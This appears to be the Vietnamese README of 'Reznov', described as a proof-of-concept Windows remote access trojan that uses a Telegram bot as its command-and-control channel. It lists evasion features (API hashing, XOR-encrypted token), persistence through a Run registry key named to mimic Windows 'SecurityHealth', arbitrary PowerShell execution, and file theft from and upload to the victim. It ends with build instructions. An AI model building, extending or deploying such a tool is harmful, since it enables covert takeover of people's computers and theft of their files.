# Reznov — Telegram C2 Malware

Proof-of-concept Remote Access Tool sử dụng Telegram Bot API làm kênh C2.

---

## Tính năng

### C2 Channel
- Telegram Bot API làm kênh điều khiển — traffic HTTPS, blend vào traffic hợp lệ
- Long-polling (`timeout=30`) để nhận lệnh realtime
- Filter lệnh theo `chat_id` — chỉ chấp nhận từ operator được cấu hình
- Gửi output dạng JSON body, không URL-encoded

### Obfuscation
- **API Hashing** — resolve Windows API tại runtime qua hash thay vì import trực tiếp, tránh lộ IAT
- **XOR Encryption** — bot token và registry path được mã hóa trong binary, decrypt lúc runtime

### Persistence
- Ghi vào `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Registry key name: `SecurityHealth`
- **Single instance mutex** — tránh chạy nhiều process khi Windows restart loop
- **Startup jitter** — delay ngẫu nhiên 10–30 giây khi launch từ Run key, tránh traffic pattern cố định sau mỗi lần boot

### Command Execution
- Toàn bộ lệnh chạy qua **PowerShell** (`-NoProfile -NonInteractive`)
- `cd` / `cd..` xử lý native — working directory persist giữa các lệnh
- `cmd <lệnh>`
- **Timeout 30 giây** — tự kill process nếu treo (tránh block bởi interactive shell)
- Output chunking 4000 ký tự/message

### Telegram Commands

| Command | Mô tả |
|---|---|
| `/help` | Danh sách lệnh |
| `/information` | Thông tin hệ thống: hostname, user, OS, CPU, RAM, IP, uptime, CWD |
| `/healthcheck` | Xác nhận host còn online, trả về PID |
| `/download <path>` | Gửi file từ máy victim lên Telegram |
| `/upload [dest]` | Nhận file từ Telegram, lưu xuống máy victim |
| `<lệnh bất kỳ>` | Thực thi PowerShell, trả output về chat |

---

## Build

### Yêu cầu
- MinGW-w64 (g++)
- [nlohmann/json](https://github.com/nlohmann/json) (header-only, đã có trong repo)

### Cấu hình trước khi build

**1. Sinh encrypted bot token** (`gen_enc.py`):
```
python gen_enc.py "YOUR_BOT_TOKEN"
```
Paste output vào `client.cpp` dòng `encryptedBotToken[]`.

**2. Cập nhật `serverChatId`** trong `client.cpp`:
```cpp
const long long serverChatId = YOUR_CHAT_ID;
```

### Lệnh build
```bash
g++ client.cpp -I"nlohmann\single_include" -o client.exe \
  -lwinhttp -lws2_32 -ladvapi32 -mwindows -std=c++17 -O2
```

### Output
File `client.exe`

---

## Runtime Dependencies

| Library | Nguồn | Cần mang theo |
|---|---|---|
| `winhttp.dll` | Windows built-in (XP SP2+) | Không |
| `nlohmann/json` | Header-only, compile vào binary | Không |
| `advapi32.dll` | Windows built-in | Không |
| `ws2_32.dll` | Windows built-in | Không |

---

## Cấu trúc project

```
Reznov/
├── client.cpp          # Source chính
├── gen_enc.py          # Tool sinh XOR-encrypted arrays
├── nlohmann/           # nlohmann/json header-only library
│   └── single_include/
│       └── nlohmann/
│           └── json.hpp
└── README.md
```

---

## Kỹ thuật sử dụng

- API Hashing (export table walk + custom hash)
- XOR string obfuscation
- Anonymous pipe cho process I/O capture
- WinHTTP cho HTTPS communication
- Multipart form-data
- HKCU registry persistence
- Named mutex single instance
- Telegram Bot API (getUpdates long-polling, sendMessage, sendDocument, getFile)
